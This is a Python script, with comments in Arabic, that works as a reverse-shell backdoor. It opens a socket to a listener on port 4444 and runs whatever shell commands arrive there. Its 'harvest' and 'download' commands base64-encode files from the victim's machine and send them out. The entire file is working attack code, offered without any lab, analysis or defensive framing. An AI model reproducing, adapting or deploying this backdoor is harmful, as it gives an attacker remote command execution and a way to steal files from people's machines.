import socket, subprocess, base64, os, glob
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4444))
while True:
    cmd = s.recv(4096).decode()
    if cmd.lower() == 'exit': break
    try:
        if cmd.startswith('harvest '):
            folder = cmd.split(' ', 1)[1]
            files = glob.glob(os.path.join(folder, '*.*'))[:10]
            for filepath in files:
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        data = base64.b64encode(f.read()).decode()
                    ext = os.path.splitext(filepath)[1] # استخراج الامتداد
                    s.send(f"FILE_START:{ext}:{data}:FILE_END".encode())
                    s.recv(1024) # تأكيد الاستلام
            s.send(b"HARVEST_DONE")
        elif cmd.startswith('download '):
            path = cmd.split(' ', 1)[1]
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    data = base64.b64encode(f.read()).decode()
                ext = os.path.splitext(path)[1]
                s.send(f"FILE_START:{ext}:{data}:FILE_END".encode())
            else:
                s.send(b"FILE_NOT_FOUND")
        else:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            s.send(out)
    except Exception as e:
        s.send(str(e).encode())

